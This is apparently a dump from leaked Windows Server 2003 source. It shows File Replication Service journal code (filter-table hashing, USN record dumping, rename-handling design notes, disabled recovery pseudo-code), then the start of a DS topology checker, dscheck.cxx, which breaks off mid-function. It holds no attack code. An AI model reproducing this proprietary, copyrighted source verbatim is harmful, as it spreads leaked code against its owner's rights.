        return ERROR_SUCCESS;
    }
    //
    // Apply the function to the root node.
    // The function could remove the node from the table but not from the list
    // since our caller has the child list replica lock.  Bump the ref count
    // to keep the memory from being freed.
    //
    INCREMENT_FILTER_REF_COUNT(FilterEntry);

    WStatus = (Function)(Table, FilterEntry, Context);
    if (!WIN_SUCCESS(WStatus)) {
        goto RETURN;
    }
    //
    // Warning:  If the function above deletes the node the following ref
    // is invalid.  This should not be a problem because deletes should only
    // be done bottom up.
    //
    ListHead = &FilterEntry->ChildHead;

    ForEachSimpleListEntry(ListHead, FILTER_TABLE_ENTRY, ChildEntry,
        //
        // pE is of type PFILTER_TABLE_ENTRY.
        //
        //
        // Apply the function to each child node.
        // The function could remove the node from the list but the list macro
        // has captured the Flink so the traversal can continue.
        //
        if (!IsListEmpty(&pE->ChildHead)) {
            //
            // Recurse on the child's list head.
            //
            WStatus = JrnlEnumerateFilterTreeTD(Table, pE, Function, Context);
        } else {
            INCREMENT_FILTER_REF_COUNT(pE);
            WStatus = (Function)(Table, pE, Context);
        }

        if (!WIN_SUCCESS(WStatus)) {
            goto RETURN;
        }

    );

    WStatus = ERROR_SUCCESS;

    //
    // Done with this Root node so decrement the ref count which could
    // cause it to be deleted.
    //
RETURN:

    return WStatus;
}



VOID
JrnlHashEntryFree(
    PGENERIC_HASH_TABLE Table,
    PVOID Buffer
    )
/*++

Routine Description:

    Free the memory pointed to by Buffer.

Arguments:

    Table  -- ptr to a hash table struct (has heap handle).
    Buffer -- ptr to buffer to free.

Return Value:

    None.

--*/
{
#undef DEBSUB
#define DEBSUB  "JrnlHashEntryFree:"

    FrsFreeType(Buffer);
}


BOOL
JrnlCompareFid(
    PVOID Buf1,
    PVOID Buf2,
    ULONG Length
)
/*++

Routine Description:

    Compare two keys for equality.

Arguments:

    Buf1 -- ptr to key value 1.
    Buf1 -- ptr to key value 2.
    Length -- should be 8 bytes.

Return Value:

    TRUE if they match.

--*/
{
#undef DEBSUB
#define DEBSUB  "JrnlCompareFid:"

    if (!ValueIsMultOf4(Buf1)) {
        DPRINT3(0, "ERROR - Unaligned key value - addr: %08x, len: %d, Data: %08x\n",
                Buf1, Length, *(PULONG)Buf1);
        FRS_ASSERT(ValueIsMultOf4(Buf1));
        return 0xFFFFFFFF;
    }

    if (!ValueIsMultOf4(Buf2)) {
        DPRINT3(0, "ERROR - Unaligned key value - addr: %08x, len: %d, Data: %08x\n",
                Buf2, Length, *(PULONG)Buf2);
        FRS_ASSERT(ValueIsMultOf4(Buf2));
        return 0xFFFFFFFF;
    }

    if (Length != sizeof(ULONGLONG)) {
        DPRINT1(0, "ERROR - Invalid Length: %d\n", Length);
        FRS_ASSERT(Length == sizeof(LONGLONG));
        return 0xFFFFFFFF;
    }

    return RtlEqualMemory(Buf1, Buf2, sizeof(ULONGLONG));
}


ULONG
JrnlHashCalcFid (
    PVOID Buf,
    ULONG Length
)
/*++

Routine Description:

    Calculate a hash value on an NTFS file ID for the journal filter table.

Arguments:

    Buf -- ptr to a file ID.
    Length -- should be 8 bytes.

Return Value:

    32 bit hash value.

--*/
{
#undef DEBSUB
#define DEBSUB  "JrnlHashCalcFid:"

    PULONG pUL = (PULONG) Buf;

    if (!ValueIsMultOf4(pUL)) {
        DPRINT3(0, "ERROR - Unaligned key value - addr: %08x, len: %d, Data: %08x\n",
                pUL, Length, *pUL);
        FRS_ASSERT(ValueIsMultOf4(pUL));
        return 0xFFFFFFFF;
    }

    if (Length != sizeof(LONGLONG)) {
        DPRINT1(0, "ERROR - Invalid Length: %d\n", Length);
        FRS_ASSERT(Length == sizeof(LONGLONG));
        return 0xFFFFFFFF;
    }

    return  HASH_FID(pUL, 0x80000000);
}


ULONG
NoHashBuiltin (
    PVOID Buf,
    ULONG Length
)
/*++

Routine Description:

    No-op function for hash tables that use an external function to
    do hash calculations.  It returns the low 4 bytes of the quadword.

Arguments:

    Buf -- ptr to a file ID.
    Length -- should be 8 bytes.

Return Value:

    32 bit hash value.

--*/
{
#undef DEBSUB
#define DEBSUB  "NoHashBuiltin:"


    PULONG pUL = (PULONG) Buf;

    if (!ValueIsMultOf4(pUL)) {
        DPRINT3(0, "ERROR - Unaligned key value - addr: %08x, len: %d, Data: %08x\n",
                pUL, Length, *pUL);
        FRS_ASSERT(ValueIsMultOf4(pUL));
        return 0xFFFFFFFF;
    }

    if (Length != sizeof(LONGLONG)) {
        DPRINT1(0, "ERROR - Invalid Length: %d\n", Length);
        FRS_ASSERT(Length == sizeof(LONGLONG));
        return 0xFFFFFFFF;
    }

    return (*pUL & (ULONG) 0x7FFFFFFF);
}


BOOL
JrnlCompareGuid(
    PVOID Buf1,
    PVOID Buf2,
    ULONG Length
)
/*++

Routine Description:

    Compare two keys for equality.

Arguments:

    Buf1 -- ptr to key value 1.
    Buf1 -- ptr to key value 2.
    Length -- should be 16 bytes.

Return Value:

    TRUE if they match.


--*/
{
#undef DEBSUB
#define DEBSUB  "JrnlCompareGuid:"

    if (!ValueIsMultOf4(Buf1)) {
        DPRINT3(0, "ERROR - Unaligned key value - addr: %08x, len: %d, Data: %08x\n",
                Buf1, Length, *(PULONG)Buf1);
        FRS_ASSERT(ValueIsMultOf4(Buf1));
        return 0xFFFFFFFF;
    }

    if (!ValueIsMultOf4(Buf2)) {
        DPRINT3(0, "ERROR - Unaligned key value - addr: %08x, len: %d, Data: %08x\n",
                Buf2, Length, *(PULONG)Buf2);
        FRS_ASSERT(ValueIsMultOf4(Buf2));
        return 0xFFFFFFFF;
    }

    if (Length != sizeof(GUID)) {
        DPRINT1(0, "ERROR - Invalid Length: %d\n", Length);
        FRS_ASSERT(Length == sizeof(GUID));
        return 0xFFFFFFFF;
    }

    return RtlEqualMemory(Buf1, Buf2, sizeof(GUID));
}


ULONG
JrnlHashCalcGuid (
    PVOID Buf,
    ULONG Length
)
/*++

Routine Description:

    Calculate a hash value for a Guid.

        From \nt\private\rpc\runtime\mtrt\uuidsup.hxx

        This is the "true" OSF DCE format for Uuids.  We use this
        when generating Uuids.  The NodeId is faked on systems w/o
        a netcard.

        typedef struct _RPC_UUID_GENERATE
        {
            unsigned long  TimeLow;                // 100 ns units
            unsigned short TimeMid;
            unsigned short TimeHiAndVersion;
            unsigned char  ClockSeqHiAndReserved;
            unsigned char  ClockSeqLow;
            unsigned char  NodeId[6];              // constant
        } RPC_UUID_GENERATE;

        TimeLow wraps every 6.55ms and is mostly zero.
        Not quite true since GUIDs are allocated
        in time based blocks and then successive GUIDS are created by
        bumping the TimeLow by one until the block is consumed.

Arguments:

    Buf -- ptr to a Guid.
    Length -- should be 16 bytes.

Return Value:

    32 bit hash value.

--*/
{
#undef DEBSUB
#define DEBSUB  "JrnlHashCalcGuid:"

    PULONG pUL = (PULONG) Buf;
    PUSHORT pUS = (PUSHORT) Buf;

    if (!ValueIsMultOf4(pUL)) {
        DPRINT3(0, "ERROR - Unaligned key value - addr: %08x, len: %d, Data: %08x\n",
                pUL, Length, *pUL);
        FRS_ASSERT(ValueIsMultOf4(pUL));
        return 0xFFFFFFFF;
    }

    if (Length != sizeof(GUID)) {
        DPRINT1(0, "ERROR - Invalid Length: %d\n", Length);
        FRS_ASSERT(Length == sizeof(GUID));
        return 0xFFFFFFFF;
    }

    //
    // Calc hash based on the time since the rest of it is eseentially constant.
    //
    return (ULONG) (pUS[0] ^ pUS[1] ^ pUS[2]);

}


ULONG
JrnlHashCalcUsn (
    PVOID Buf,
    ULONG Length
)
/*++

Routine Description:

    Calculate a hash value on an NTFS USN Journal Index.

Arguments:

    Buf -- ptr to a file ID.
    Length -- should be 8 bytes.

Return Value:

    32 bit hash value.

--*/
{
#undef DEBSUB
#define DEBSUB  "JrnlHashCalcUsn:"

    ULONG Value, HighPart, LowPart;

    if (!ValueIsMultOf4(Buf)) {
        DPRINT3(0, "ERROR - Unaligned key value - addr: %08x, len: %d, Data: %08x\n",
                Buf, Length, *(PULONG)Buf);
        FRS_ASSERT(ValueIsMultOf4(Buf));
        return 0xFFFFFFFF;
    }

    if (Length != sizeof(LONGLONG)) {
        DPRINT1(0, "ERROR - Invalid Length: %d\n", Length);
        FRS_ASSERT(Length == sizeof(LONGLONG));
        return 0xFFFFFFFF;
    }

    LowPart = *(PULONG) Buf;
    HighPart = *(PULONG)( (PCHAR) Buf + 4 );

    //
    // USNs are quadword offsets so shift the low part an extra 3 bits.
    //
    Value = (HighPart >> 16) + HighPart + (LowPart >> 19) + (LowPart >> 3);

    return Value;

}


VOID
CalcHashFidAndName(
    IN PUNICODE_STRING Name,
    IN PULONGLONG      Fid,
    OUT PULONGLONG     HashValue
    )
/*++

Routine Description:

    This routine forms a 32 bit hash of the name and File ID args.
    It returns this in the low 32 bits of HashValue.  The upper 32 bits are zero.

    Note: If there is room at the end of the Unicode String buffer for the Name,
    code below will add a NULL for printing.

Arguments:

    Name - The filename to hash.
    Fid - The FID to hash.
    HashValue - The resulting quadword hash value.

Return Value:

    Not used

--*/
{
#undef DEBSUB
#define DEBSUB  "CalcHashFidAndName:"

    PUSHORT p;
    ULONG NameHash = 0;
    ULONG Shift = 0;
    ULONG FidHash;
    ULONG NChars, MaxNChars;
    PULONG pUL;

    FRS_ASSERT( Name != NULL );
    FRS_ASSERT( Fid != NULL );
    FRS_ASSERT( ValueIsMultOf2(Name->Buffer) );
    FRS_ASSERT( ValueIsMultOf2(Name->Length) );
    FRS_ASSERT( Name->Length != 0 );
    FRS_ASSERT( ValueIsMultOf8(Fid) );


    NChars = Name->Length / sizeof(WCHAR);

    //
    // Combine each unicode character into the hash value, shifting 4 bits
    // each time.  Start at the end of the name so file names with different
    // type codes will hash to different table offsets.
    //
    for( p = Name->Buffer + NChars - 1;
         p >= Name->Buffer;
         p-- ) {

        NameHash = NameHash ^ (((ULONG)towupper(*p)) << Shift);
        Shift = (Shift < 16) ? Shift + 4 : 0;

    }

    pUL = (ULONG *) Fid;
    FidHash = (ULONG) HASH_FID(pUL, 0x80000000);
    if (FidHash == 0) {
        DPRINT(4, "Warning - FidHash is zero.\n");
    }

    *HashValue = (ULONGLONG) (NameHash + FidHash);

    if (*HashValue == 0) {
        DPRINT(0, "Error - HashValue is zero.\n");
    }

    //
    // Make sure the FileName has a unicode null at the end before we print it.  This is
    //
    MaxNChars = Name->MaximumLength / sizeof(WCHAR);

    if (Name->Buffer[NChars-1] != UNICODE_NULL) {
        if (NChars >= MaxNChars) {
            //
            // No NULL at the end of the name and no room to add one.
            //
            DPRINT4(4, "++ HV: %08x, Hfid: %08x, Fid: %08x %08x, Hnam: %08x, Name: cannot print\n",
               (NameHash+FidHash), FidHash, PRINTQUAD(*Fid), NameHash);
            return;
        }
        Name->Buffer[NChars] = UNICODE_NULL;
    }

    DPRINT5(4, "++ HV: %08x, Hfid: %08x, Fid: %08x %08x, Hnam: %08x, Name: %ws\n",
       (NameHash+FidHash), FidHash, PRINTQUAD(*Fid), NameHash, Name->Buffer);

}


VOID
JrnlFilterPrintJacket(
    PGENERIC_HASH_TABLE Table,
    PVOID Buffer
    )
{
    JrnlFilterPrint(5, Table, Buffer);
}


VOID
JrnlFilterPrint(
    ULONG PrintSev,
    PGENERIC_HASH_TABLE Table,
    PVOID Buffer
    )
/*++

Routine Description:

    print out a hash table entry.

Arguments:

    Table  -- ptr to a hash table struct.
    Buffer -- ptr to entry.

Return Value:

    none.


--*/
{
#undef DEBSUB
#define DEBSUB  "JrnlFilterPrint:"

PFILTER_TABLE_ENTRY Entry = (PFILTER_TABLE_ENTRY)Buffer;

    DPRINT3(PrintSev, "Addr: %08x,  HashValue: %08x  RC: %d\n",
            Entry,
            Entry->HashEntryHeader.HashValue,
            Entry->HashEntryHeader.ReferenceCount);

    DPRINT2(PrintSev, "List Entry - %08x,  %08x\n",
           Entry->HashEntryHeader.ListEntry.Flink,
           Entry->HashEntryHeader.ListEntry.Blink);


    DPRINT2(PrintSev, "FileId: %08x %08x, ParentFileId: %08x %08x\n",
            PRINTQUAD(Entry->DFileID), PRINTQUAD(Entry->DParentFileID));

    DPRINT2(PrintSev, "Replica Number: %d,  FileName: %ws\n",
            Entry->DReplicaNumber, Entry->UFileName.Buffer);

    DPRINT3(PrintSev, "Sequence Number: %d,  Transition Type: %d,  FrsVsn: %08x %08x\n",
            READ_FILTER_SEQ_NUMBER(Entry),
            READ_FILTER_TRANS_TYPE(Entry),
            PRINTQUAD(Entry->FrsVsn));

    DPRINT4(PrintSev, "Childhead Entry - %08x,  %08x  Child Link Entry - %08x,  %08x\n",
           Entry->ChildHead.Flink, Entry->ChildHead.Blink,
           Entry->ChildEntry.Flink, Entry->ChildEntry.Blink);

}

#undef PrintSev



VOID
JrnlChangeOrderPrint(
    PGENERIC_HASH_TABLE Table,
    PVOID Buffer
    )
/*++

Routine Description:

    print out a hash table entry.

Arguments:

    Table  -- ptr to a hash table struct.  (unused)
    Buffer -- ptr to entry.

Return Value:

    none.

--*/
{
#undef DEBSUB
#define DEBSUB  "JrnlChangeOrderPrint:"

    FRS_PRINT_TYPE(0, (PCHANGE_ORDER_ENTRY)Buffer);

}




VOID
DumpUsnRecord(
    IN ULONG Severity,
    IN PUSN_RECORD UsnRecord,
    IN ULONG ReplicaNumber,
    IN ULONG LocationCmd,
    IN PCHAR Debsub,
    IN ULONG uLineNo
    )
/*++

Routine Description:

    This routine prints out the contents of a NTFS USN Journal Record.

Arguments:

    Severity -- Severity level for print.  (See debug.c, debug.h)
    UsnRecord - The address of the UsnRecord.
    ReplicaNumber - ID number of the replica set
    LocationCmd - Decoded location command for this USN record.
    Debsub -- Name of calling subroutine.
    uLineno -- Line number of caller

MACRO:  DUMP_USN_RECORD, DUMP_USN_RECORD2

Return Value:

    none.
--*/
{
#undef DEBSUB
#define DEBSUB  "DumpUsnRecord:"

    ULONG Len;
    CHAR TimeString[TIME_STRING_LENGTH];
    CHAR Tstr1[200];
    WCHAR FName[MAX_PATH+1];
    CHAR  FlagBuf[120];

    //
    // Don't print this
    //
    if (!DoDebug(Severity, Debsub)) {
        return;
    }
    //
    // Get hh:mm:ss.
    //
    FileTimeToStringClockTime((PFILETIME) &UsnRecord->TimeStamp, TimeString);

    //
    // Put file name in a buffer so we can put a null at the end of it.
    //
    Len = min((ULONG)UsnRecord->FileNameLength, MAX_PATH);
    CopyMemory(FName, UsnRecord->FileName, Len);
    FName[Len/2] = UNICODE_NULL;

    //
    // Build the trace record.
    //
    _snprintf(Tstr1, sizeof(Tstr1),
    ":U: %08x %d  Fid %08x %08x  PFid %08x %08x  At %08x Sr %04x %s %7s %ws",
         (ULONG)UsnRecord->Usn,
         ReplicaNumber,
         PRINTQUAD(UsnRecord->FileReferenceNumber),
         PRINTQUAD(UsnRecord->ParentFileReferenceNumber),
         UsnRecord->FileAttributes,
         UsnRecord->SourceInfo,
         TimeString,
         CoLocationNames[LocationCmd],
         FName
    );
    Tstr1[sizeof(Tstr1)-1] = '\0';

    DebPrint(Severity, "%s\n", Debsub, uLineNo, Tstr1);

    //
    // Output reason string on sep line.
    //
    FrsFlagsToStr(UsnRecord->Reason, UsnReasonNameTable, sizeof(FlagBuf), FlagBuf);

    _snprintf(Tstr1, sizeof(Tstr1),
    ":U: Fid %08x %08x  Reason %08x Flags [%s]",
         PRINTQUAD(UsnRecord->FileReferenceNumber),
         UsnRecord->Reason,
         FlagBuf
    );
    Tstr1[sizeof(Tstr1)-1] = '\0';

    DebPrint(Severity, "%s\n", Debsub, uLineNo, Tstr1);

    //
    // Output file attributes string on sep line.
    //
    FrsFlagsToStr(UsnRecord->FileAttributes, FileAttrFlagNameTable, sizeof(FlagBuf), FlagBuf);

    _snprintf(Tstr1, sizeof(Tstr1),
    ":U: Fid %08x %08x  Attrs  %08x Flags [%s]",
         PRINTQUAD(UsnRecord->FileReferenceNumber),
         UsnRecord->FileAttributes,
         FlagBuf
    );
    Tstr1[sizeof(Tstr1)-1] = '\0';

    DebPrint(Severity, "%s\n", Debsub, uLineNo, Tstr1);
}

VOID
JrnlDumpVmeFilterTable(
    VOID
    )
/*++
Routine Description:
    Dump the VME filter table

Arguments:
    None.

Return Value:
    None.
--*/
{
#undef DEBSUB
#define DEBSUB  "JrnlDumpVmeFilterTable:"

    ForEachListEntry( &VolumeMonitorStopQueue, VOLUME_MONITOR_ENTRY, ListEntry,


        DPRINT(4, "\n");
        DPRINT1(4, "==== start of VME Filter table dump for %ws ===========\n", pE->FSVolInfo.VolumeLabel);
        DPRINT(4, "\n");
        if (pE->FilterTable != NULL) {
            // GHT_DUMP_TABLE(5, pE->FilterTable);
            NOTHING;
        } else {
            DPRINT(4, "Filter table freed\n");
        }
        DPRINT(4, "\n");
        DPRINT(4, "============== end of Vme Filter table dump ============\n");
        DPRINT(4, "\n");


    );
}





/*++

 The two tables below describe all the possible outcomes of a directory
 rename operation. The case numbers in parens are further described below.
 As directory changes appear in the USN data stream the filter table for
 the volume is updated immediately, even in the case of subtree renames.
 This allows us to accurately filter subsequent USN records and associate
 them with the correct replica set.
 (R.S. means Replica Set)

                  Parent
     FileID       FileID
  Filter Entry  Filter Entry       Interpretation        :  Action
  ------------  ------------       --------------           ------
     Absent       Absent      Wasn't in R.S., Still Isn't:  Skip
(1)  Absent       Present     Wasn't in R.S., Now Is     :  Create entry (MOVEIN)
(2)  Present      Absent      Was in R.S.   , Now Isn't  :  MOVEOUT
     Present      Present     Was in R.S.   , Still Is   :  Eval Further

 The last case above requires further evaluation to determine if the
 directory has moved from one directory to another or from one replica
 set to another.

   FileID Compare   R.S. compare
   between Filter   Between File
   Entry & USn Rec  and Parent     Interpretation        :  Action
   --------------   -----------    --------------           ------
(3)  Same Parent    Same R.S.    File stayed in same Dir.:  Check Name
     Same Parent    Diff. R.S.   Error, shouldn't happen :
(4)  Diff. Parent   Same R.S.    Ren to diff dir in R.S. :  Update Parent Fid (MOVEDIR)
(5)  Diff. Parent   Diff. R.S.   Rename to diff R.s.     :  MOVERS

 For directory renames there are 5 cases to consider:

  1. MOVEIN - Rename of a directory into a replica set.  The filter table lookup
     failed on the FID but the parent FID is in the table.  We add an entry for
     this DIR to the filter table.  The update process must enumerate the
     subtree on disk and evaluate each file for inclusion into the tree,
     updating the Filter table as it goes.  We may see file operations several
     levels down from the rename point and have no entry in the Filter Table so
     we pitch those records.  The sub-tree enumeration process must handle this
     as it incorporates each file into the IDTable.


  2. MOVEOUT - Parent FID change to a dir OUTSIDE of any replica set on the
     volume.  This is a delete of an entire subtree in the Replica set.  We
     enumerate the subtree bottom-up, sending dir level change orders to the
     update process as we delete the filter table entries.


  3. Name change only.  The Parent FID in the USN record matches the
     Parent FID in the Filter entry for the directory.
     Update the name in the filter entry.


  4. MOVEDIR - Parent FID in USN record is different from the parent FID in the
     Filter entry so this is a rename to a dir in the SAME replica set.
     Update the parent FID in the filter enty and Filename too.

  5. MOVERS - The Parent FID in the USN record is associated with a directory
     in a DIFFERENT replica set on the volume.  Update the parent FID, the
     replica ptr, and name in the filter entry.  This is a move of an entire
     subtree from one replica set to another.  We enumerate the subtree
     top-down, sending dir level change orders to the update process as we
     update the replica set information in the filter table entries.


--*/




/*
  Note:  doc: - update this description

                Removing a sub-tree from a replica set

This is a multi-stage process that occurs when a directory is renamed out of
the replica set.  This is managed by the update process.

1. The Journal Process has marked the filter entry for the renamed directory
as DELETED.  This ensures that operations on any files below this directory
are filtered out by the Journal process.  A change order describing the subtree
delete is queued to the Replica Change Order process queue.

2.  When the update process encounters the subtree delete change order it walks
thru the subtree (using either the directory entries in the Filter Hash Table or
the Replica IDTable) breadthfirst from the leaves of the subtree to the subtree
to the subtree root.  For each file or directory it tombstones the entry in the
IDTable and builds a delete change order to send to its outbound partners.  In
addtion it deletes the entries from the volume filter table and the DIRTable as
it progresses.  If a crash or shutdown request ocurrs during this operation
the process continues with the remaining entries when it resumes.

3. The operation completes when the root of the sub-tree is processed.



                Adding a sub-tree (X) to a replica set

This occurs when directory X is renamed into a replica set.  It is managed by
the Update Process.

1.  The Journal Process creates a Filter entry for the sub-tree root (X) and
queues a change order to the update process.  At this point the Journal process
has no knowledge of what is beneath this directory.  If it sees an operation on
a direct child of X it builds a change order and queues it to the update
process.  In addition if it sees a directory create/delete or rename operation
on a direct child of X it increments sequence number in the Filter Table Entry
for X and creates a new Filter Table entry as appropriate.

2.  The update process takes the "sub-tree add" change order and processes the
sub-tree starting at X, enumerating the subtree down to the leaves in a breadth
first order.  For each entry in the subtree it creates an IDTable entry for the
file or directory.  If a directory it also creates a DIRTable entry and adds an
entry to the Filter Table.  As each Filter Table entry is made the Journal
subsystem will begin sending change orders to the update process for any new
file operations under the directory.  For each directory, the filter table entry
is made first, if it doesn't already exist.  then the update process enumerates
the directory contents.  If new direct children are created while the
enumeration is in process change orders are queued to the update process.  If
the USN on the change order is less than or equal to the USN saved when the file
was first processed then the change order is discarded.  Otherwise the change
occurred after the point when the file was processed.

It is possible for the update process to receive update or delete
change orders for files that are not yet present in the IDTable because the
enumeration hasn't reached them yet.  For files or dirs created "behind" the
enumeration process point, change orders are queued that will pick them up.
The first problem is solved by having the update process stop processing
further change orders on this replica set until the enumeration is complete.



*/


#if 0

/*

Recovery mode processing for the NTFS journal.

Objective:  When FRS or the system crashes we have lost the write filter
the journal code uses to filter out FRS related writes to files.
We need to reliably identify those USN records that were caused by FRS
so we don't propagate out a file that was being installed at the time
of the crash.  Such a file will undoubtedly be corrupt and will get sent
to every member of the replica set.

In the case of system crashes, NTFS inserts close records into the journal
for any files that were open at the time of the crash.  NTFS marks those
USN records with a flag that indicates they were written at startup.  In
addtion a user app can force a close record to be written to the journal
through an FSCTL call.  If this happens and no futher modification is made
to the file then no close record will be written by NTFS when the last handle
on the file is closed or at startup.

In the case of FRS service crashes or externally generated process Kills
FRS will fail to perform a clean shutdown.  As each change order is processed
it is marked as work in process.  When the change order either retires or
goes into a retry state the work in process flag is cleared.  From this
information we can determine those files that may have had FRS generated
writes in process when the service died.

The flow is as follows:

At replica startup scan the inbound log and build a hash table (PendingCOTable)
of all entries with the following information kept with each entry:

    File FID
    File GUID
    Local/Remote CO flag
    CO Inprocess flag
    Usn index of most recent USN record that contributed to the local CO.

    There could be multiple COs pending for the same file.  OR the state of
    the Inprocess flags and save the state of the most recent CO's local/rmt flag.
    The PendingCoTable continues to exist after startup so we can evaluate
    dependencies between newly arrived COs and COs in a retry state in the inlog.

In addition:
    The Largest NTFS USN for any local inbound CO is saved in RecoveryUsnStart.
    The current end of the USN journal is saved in RecoveryUsnEnd.
    Both are saved in the Replica struct.


    ULONGLONG FileReferenceNumber;
    ULONGLONG ParentFileReferenceNumber;
    USN Usn;
    LARGE_INTEGER TimeStamp;

*/
Start USN read at Replica->RecoveryUsnStart.

if (UsnRecord->Usn < Replica->RecoveryUsnEnd) {


    if (IsNtfsRecoveryClose(UsnRecord)) {
        //
        // assume that all the file data may not have been written out
        // so the file may be corrupt.
        //
        PendingCo = InPendingCoTable(Replica->PendingCoTable,
                                     &UsnRecord->FileReferenceNumber);
        if ((PendingCo == NULL) || (PendingCo->LocalCo)) {
            //
            // The file was being written locally at the time of the crash.
            // It is probably corrupt.
            // Create a file refresh change order and send it to one of our
            // inbound partners to get their version of the file.
            // Note: This request is queued so the first inbound partner to
            // join will get it.
            // Note: Since we are reading after RecoveryUsnStart the USN
            // should not be less than what we see in the inlog.
            //
            FRS_ASSERT(UsnRecord->Usn >= PendingCo->Usn);
            RequestRefreshCo(Replica, &UsnRecord->FileReferenceNumber);

            goto GET_NEXT_USN_RECORD;

        } else {
            //
            // There is a pending remote CO for this file.  It will install
            // a new copy of the file.
            //
            // Note: if there are multiple remote COs in the process queue
            // the last one may not be the one that is finally accepted.
            // But we need to be sure that none of the local COs that are pending
            // are allowed propagate.
            //
            // If this CO was in process at the time of the crash and the
            // CO was already propagated to the outlog, the staging file may
            // be corrupted.  Delete the CO from the outlog and queue a
            // refresh request to the inbound partner.
            //
            // Note: We could still have a corrupted file.  If it was locally
            //       changed and we processed the CO, updating the IDTable and
            //       inserting the CO in the outlog but a crash still resulted
            //       in not all dirty data pages being flushed.
            //       WHEN WE GEN THE LOCAL STAGE FILE CAN WE FORCE A FLUSH?

        }

        if (IsFileFrsStagingFile(UsnRecord)) {
            //
            // This is an FRS staging file.  It may be corrupt.
            // Delete it and regenerate it by setting a new start state in
            // the related CO.  (CO Guid is derived from the name of the file).
            // There may not be a CO for this file if the inlog record has
            // been deleted.  There may still be a CO in the outlog though so
            // just delete the staging file, forcing it to be regenerated on
            // demand from the local file.
            //
            // If the local file is suspect then we need to refresh it from
            // an inbound partner so delete the CO in the outlog and let the
            // refresh CO PROPAGATE as needed.
            //
            // Note that the IDTable entry may already have been updated because
            // this CO retired.  That would cause the refresh CO to fail to
            // be accepted.  Put some state in the refresh CO so when it comes
            // back if that state matches the state in the IDTable entry then
            // we know to accepr the refresh CO regardless of other reconcile
            // info.  If however another local or remote CO has updated the
            // file in the interim then the refresh CO is stale and should be
            // discarded.
            //
            SetPendingCoState(SeqNum, PendingCo->LocalCo ? IBCO_STAGING_REQUESTED :
                                                           IBCO_FETCH_REQUESTED);

        }
        goto GET_NEXT_USN_RECORD;

    } else {
            //
            // Read IDTable entry for this file and get the FileUsn.
            // This is the USN associated with the most recent operation on the
            // file that we have handled.
            //

            if (UsnRecord->Usn <= IDTableRec->FileUsn) {
                //
                // This USN record is for an operation that occurred
                // prior to the last action processed related to the file.
                //
                goto GET_NEXT_USN_RECORD;

            } else {
                    //
                    // This USN record could not have come from FRS because if it did and there was no entry for
                    // a change order on the file in the Inbound Log then the LastFileUsn check above would have caught it.
                    // This is true because the inbound log record is only deleted after the file is updated and the LastFileUsn
                    // is saved in the Jet record for the file.
                    // Even if there is a change order pending in the Inbound log, FRS could not have started processing it
                    // because the USN Record is not marked as written by NTFS at recovery which would be the case
                    // if FRS had been in the middle of an update when the system crashed.  Therefore,
                    //
                    //this is not an FRS generated USN record so process the USN record normally.
            }
    }
}

/*
This solution solves the problem of FRS getting part way thru a file update
when the system crashes.  It must not process the USN record because then it
would propagate a corrupted file out to all the other members.  It also has
the nice property of refreshing a file from another partner that a user was
writing at the time of the crash.  The User has lost their changes but at
least the file is back in an uncorrupted state.
*/





#endif
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\setup\dscheck\dscheck.cxx ===
/*++

Copyright (c) 1997 Microsoft Corporation

Module Name:
	dscheck.cxx

Abstract:
	Check the consistency of the DS topology for the system volume. The DS
	tree for sites\site\nTDSSettings\mSFT-DSA\nTDSConnection is copied into
	memory. An RTL Generic Table of the mSFT-DSA objects is built. Duplicates
	are kept on a list anchored by the first occurence of a mSFT-DSA. The
	tree and the table are used to check the consistency of the topology.

	Once the checks have stablized a bit they will be listed here.

Author:
	Billy J. Fuller 3-Mar-1997 (From Jim McNelis)

Environment
	User mode winnt

--*/

#include <nt.h>
#include <ntrtl.h>
#include <nturtl.h>
#include <windows.h>
#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winldap.h>
#include <dsgetdc.h>
#include <tchar.h>

//
// We save code by recursively scanning the DS's hierarchical directory.
// The following constants tell us where we are in the hierarchy.
//
#define	SITES		0
#define	SETTINGZ	1
#define	SERVERS		2
#define	CXTIONS		3


//
// We build an incore copy of the DS hierarchy sites\settings\servers\connections.
// Hence the interrelated structs for site, settings, server, and connection
//
typedef struct cxtion	CXTION,		* PCXTION;
typedef struct server	SERVER,		* PSERVER;
typedef struct settings	SETTINGS,	* PSETTINGS;
typedef struct site		SITE,		* PSITE;

// Connection
struct cxtion {
	PTCHAR		CxtionRDN;			// relative distinguished name
	PSERVER		CxtionServer;		// address of parent
	PCXTION		CxtionNext;			// peers of this connection
	PTCHAR		CxtionPartner;		// inbound partner's RDN
} * Settingss;

// Server
struct server {
	PTCHAR		ServerRDN;			// relative distinguished name
	PSETTINGS	ServerSettings;		// address of parent
	PSERVER		ServerNext;			// peers of this server
	PCXTION		ServerOuts;			// outbound connections
	PCXTION		ServerIns;			// inbound connections
};

// Settings
struct settings {
	PTCHAR		SettingsRDN;		// relative distinguished name
	PSITE		SettingsSite;		// address of parent
	PSETTINGS	SettingsNext;		// peers of this settings
	PSERVER		SettingsServers;	// children of this settings
};

// Site
struct site {
	PTCHAR		SiteRDN;			// relative distinguished name
	PSITE		SiteNext;			// peers of this site
	PSETTINGS	SiteSettings;		// children of this site
} * Sites;


//
// We avoid N**2 algorithms by using the generic table routines to access
// servers by name.
//
RTL_GENERIC_TABLE ServerTable;


//
// The entry in the generic table points to a sever struct. The entry can
// be looked up by the server's relative distinguished name (ServerRDN).
//
// Although duplicate server names are not allowed, a user may have
// created servers with the same RDN. These duplicates are kept as
// a linked list anchored by RtlServerDups. The duplicates are ignored.
// The first entry encountered while scanning the DS tree is used as
// the "correct" server.
//
typedef struct rtlserver RTLSERVER, * PRTLSERVER;
struct rtlserver {
	PRTLSERVER	RtlServerDups;
	PSERVER		RtlServer;
};


RTL_GENERIC_COMPARE_RESULTS
RtlServerCompare(
	PRTL_GENERIC_TABLE Table,
	PVOID FirstStruct,
	PVOID SecondStruct
	)
/*++
Routine Description:
	Compare two entries in the generic table for servers.

Arguments:
	Table			- Address of the table (not used).
	FirstStruct		- PRTLSERVER
	SecondStruct	- PRTLSERVER

Return Value:
	<0	First < Second
	=0	First == Second
	>0	First > Second
--*/
{
	INT			Cmp;

	Cmp = _tcscmp(((PRTLSERVER)FirstStruct)->RtlServer->ServerRDN,
					((PRTLSERVER)SecondStruct)->RtlServer->ServerRDN);
	if (Cmp < 0)
		return (GenericLessThan);
	if (Cmp == 0)
		return (GenericEqual);
	return (GenericGreaterThan);
}

PVOID
RtlServerAllocate(
	PRTL_GENERIC_TABLE Table,
	CLONG ByteSize
